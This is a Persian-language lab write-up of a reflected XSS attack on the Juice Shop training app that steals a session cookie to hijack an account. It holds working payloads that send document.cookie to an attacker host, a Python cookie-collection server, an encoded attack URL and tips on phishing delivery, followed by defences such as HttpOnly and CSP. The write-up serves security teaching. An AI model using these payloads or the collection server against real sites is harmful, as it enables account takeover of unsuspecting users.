Session Hijacking از طریق XSS — مستندسازی کامل

چگونه یک آسیب‌پذیری Reflected XSS در بخش جستجو، منجر به سرقت کوکی سشن قربانی و تصاحب حساب کاربری او شد — با تمام مراحل، کدها، و توضیح دقیق URL Encoding.

مفهوم کشف آسیب‌پذیری سرور Python Payload ها URL Encoding حمله‌ی کامل دنیای واقعی
§1

مفهوم: XSS + Session Hijacking چطور کار می‌کنه؟

وقتی یه سایت ورودی کاربر را بدون پاک‌سازی در صفحه نشان می‌دهد، مهاجم می‌تواند کدی را تزریق کند که در مرورگر قربانی اجرا شود. اگه این کد به کوکی سشن (که هویت کاربر را ثابت می‌کند) دسترسی داشته باشد و آن را برای مهاجم بفرستد، مهاجم می‌تواند بدون دانستن پسورد، دقیقاً به‌جای قربانی وارد شود.

نکته‌ی کلیدی: کوکی سشن مثل یه «کارت ورود» موقتیه — کسی که این کارت رو داشته باشه، سرور رو گول می‌زنه که فکر کنه اونه. رمز عبور اصلاً لازم نیست.
§2

کشف آسیب‌پذیری — چی کار کرد، چی کار نکرد

مرحله اول: تست با iframe + javascript (شکست خورد)

اولین payload امتحان شده:

<iframe src="javascript:document.location='http://127.0.0.1:8888/?c='+document.cookie">
چرا شکست خورد: مرورگرهای مدرن (Chrome, Firefox) اجرای javascript: را داخل src یک iframe بلاک می‌کنند. این یه محدودیت امنیتی مرورگر است، نه فیلتر سرور.

مرحله دوم: تست با تگ script (شکست خورد)

<script>new Image().src='http://127.0.0.1:8888/?c='+document.cookie</script>
چرا شکست خورد: Juice Shop تگ <script> را در ورودی جستجو فیلتر می‌کند.

مرحله سوم: تست اولیه با iframe+javascript:alert (موفق شد!)

مستقیم در input box جستجو (نه URL):

<iframe src="javascript:alert(`xss`)">
نتیجه: Alert باز شد — یعنی این endpoint آسیب‌پذیر به XSS است.

مرحله چهارم: payload نهایی که کار کرد ✅

<img src="x" onerror="new Image().src='http://127.0.0.1:8888/?c='+document.cookie">
چرا این کار کرد:
۱. تگ img فیلتر نمی‌شه
۲. وقتی مرورگر می‌خواد تصویر "x" رو لود کنه، پیداش نمی‌کنه → خطا می‌خوره → onerror اجرا می‌شه
۳. new Image().src یه درخواست HTTP پس‌زمینه می‌فرسته بدون تغییر URL قربانی
§3

سرور Python برای دریافت کوکی

کد کامل سرور

import http.server
import urllib.parse
# از datetime برای نمایش زمان دقیق دزدیدن کوکی
from datetime import datetime

class Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        params = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(params.query)
        if 'c' in query:
            print(f'\n[!] کوکی دزدیده شد — {"{datetime.now().strftime('%H:%M:%S')}"}')
            print(f'[*] IP قربانی: {"{self.client_address[0]}"}')
            print(f'[*] کوکی: {"{query[\"c\"][0]}"}')
        self.send_response(200)
        self.end_headers()

    # این متد override شده تا لاگ‌های پیش‌فرض (IP، timestamp) پاک باشه
    # و فقط اطلاعات مهم (کوکی) نمایش داده بشه
    def log_message(self, *args):
        pass

http.server.HTTPServer(('0.0.0.0', 8888), Handler).serve_forever()
چرا log_message رو override کردیم؟ بدون این کار، به ازای هر درخواست یه خط لاگ پیش‌فرض مثل این چاپ می‌شد:
127.0.0.1 - - [29/Aug/2026 05:01:13] "GET /?c=token=... HTTP/1.1" 200 -
که خروجی رو شلوغ می‌کرد. با override کردن، فقط چیز مهم (کوکی) نشون داده می‌شه.

[*] کوکی: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...

مقایسه Payload ها — چرا بعضی کار نکرد

Payloadنتیجهدلیل
<iframe src="javascript:..."> ❌ کار نکرد مرورگر مدرن javascript: در src را بلاک می‌کند
<script>...</script> ❌ کار نکرد Juice Shop تگ script را فیلتر می‌کند
<iframe src="javascript:alert(`xss`)"> ✅ alert کار کرد alert قبل از بلاک شدن اجرا می‌شود (تأیید XSS)
<img src=x onerror="..."> ✅ کوکی دزدیده شد img فیلتر نمی‌شود، onerror از CORS آزاد است

چرا new Image() بهتر از document.location است؟

// روش بد — قربانی ریدایرکت می‌شه و می‌فهمه
document.location = 'http://attacker.com/?c=' + document.cookie

// روش خوب — پس‌زمینه، قربانی هیچ‌چیز نمی‌بینه
new Image().src = 'http://attacker.com/?c=' + document.cookie
تفاوت مهم: با document.location، آدرس‌بار مرورگر عوض می‌شود و قربانی متوجه می‌شود. با new Image()، یه درخواست HTTP کاملاً پس‌زمینه ارسال می‌شود — قربانی هیچ تغییری نمی‌بیند.

URL Encoding — چرا و چطور

چرا باید Encode کنیم؟

وقتی payload رو مستقیم تو URL می‌ذاریم (نه input box)، مرورگر کاراکترهای خاص مثل < > " ' = / رو به‌عنوان بخشی از ساختار URL تفسیر می‌کند، نه به‌عنوان محتوا. برای اینکه payload دست‌نخورده به سرور برسد، باید این کاراکترها را Encode کنیم.

جدول تبدیل کاراکترهای مهم

کاراکتر اصلیURL Encodedتوضیح
<%3Cشروع تگ HTML
>%3Eپایان تگ HTML
"%22گیومه دوتایی
'%27گیومه تکی
=%3Dعلامت مساوی
space (فاصله)%20 یا +فاصله
+%2Bعلامت جمع

تجزیه‌ی دقیق URL نهایی که استفاده شد

http://127.0.0.1:3000/#/search?q=%3Cimg%20src%3D%22x%22%20onerror%3D%22new%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A8888%2F%3Fc%3D%27%2Bdocument.cookie%22%3E ⬆️ آبی: آدرس پایه سایت ⬆️ نارنجی: پارامتر q (همان ورودی جستجو) ⬆️ سبز: payload کامل به صورت URL-encoded

payload خام (قبل از encode):

<img src="x" onerror="new Image().src='http://127.0.0.1:8888/?c='+document.cookie">

بعد از encode شدن، تبدیل می‌شه به:

%3Cimg%20src%3D%22x%22%20onerror%3D%22new%20Image().src%3D%27http%3A%2F%2F127.0.0.1%3A8888%2F%3Fc%3D%27%2Bdocument.cookie%22%3E
چطور می‌تونی خودت Encode کنی؟
در Python: urllib.parse.quote(payload)
آنلاین: https://www.urlencoder.org
در Burp Suite: انتخاب متن → راست‌کلیک → Convert Selection → URL Encode

در دنیای واقعی، این لینک از طریق ایمیل فیشینگ، پیام مستقیم، یا کوتاه‌کننده‌ی لینک (bit.ly) برای قربانی فرستاده می‌شود. قربانی فقط یک کلیک می‌کند.

مهاجم مرورگر خودش را باز می‌کند، DevTools (F12) → Application → Cookies رو باز می‌کند و مقدار token را با کوکی دزدیده‌شده جایگزین می‌کند. بعد از رفرش صفحه، دقیقاً با هویت قربانی وارد شده.

نتیجه: مهاجم بدون دانستن پسورد، کاملاً به‌جای قربانی وارد شده — می‌تواند سفارش بدهد، اطلاعات را تغییر دهد، یا داده‌های حساس را ببیند.

تفاوت Reflected XSS vs Stored XSS

Reflected XSS (همین چیزی که انجام دادیم)

payload در URL است — قربانی باید روی لینک مخرب کلیک کند. هر بار که لینک باز می‌شود، payload اجرا می‌شود. اگه لینک را با کسی share نکنید، اتفاقی نمی‌افتد.

لینک مخرب:
http://target.com/#/search?q=<img onerror=...>

قربانی این لینک رو از یه ایمیل یا پیام دریافت می‌کنه و کلیک می‌کنه

Stored XSS (خطرناک‌تر)

payload در دیتابیس ذخیره می‌شود — هر کسی که آن صفحه را باز کند، بدون هیچ لینک مخربی، payload روی مرورگرش اجرا می‌شود. مثلاً یک نظر مخرب زیر یک محصول.

مهاجم یه نظر با این محتوا می‌نویسه:
"محصول خوبیه! <img src=x onerror='...'>"

حالا هر کاربری که صفحه‌ی محصول رو باز کنه،
کوکیش دزدیده می‌شه — بدون هیچ لینک مخربی!
چرا Stored XSS بدتره؟ با یه حمله، می‌تونی کوکی هزاران کاربر رو به‌صورت خودکار بدزدی — بدون اینکه نیاز باشه هر کدوم رو جداگانه فریب بدی.

نحوه‌ی جلوگیری (Defense)

دفاعتوضیح
Output Encodingهمه‌ی ورودی‌های کاربر قبل از نمایش، HTML-encode شوند
HttpOnly Cookieبا این flag، JavaScript اصلاً نمی‌تواند به کوکی دسترسی داشته باشد
Content Security Policyمشخص می‌کند مرورگر فقط از کدام منابع اسکریپت بارگذاری کند
SameSite Cookieکوکی فقط از همان origin ارسال می‌شود
نکته‌ی مهم: اگه کوکی HttpOnly بود، این حمله اصلاً امکان‌پذیر نبود — چون JavaScript به کوکی دسترسی نداشت. این یه دلیل مهم برای اینکه همیشه HttpOnly را روی کوکی‌های سشن فعال کنید.
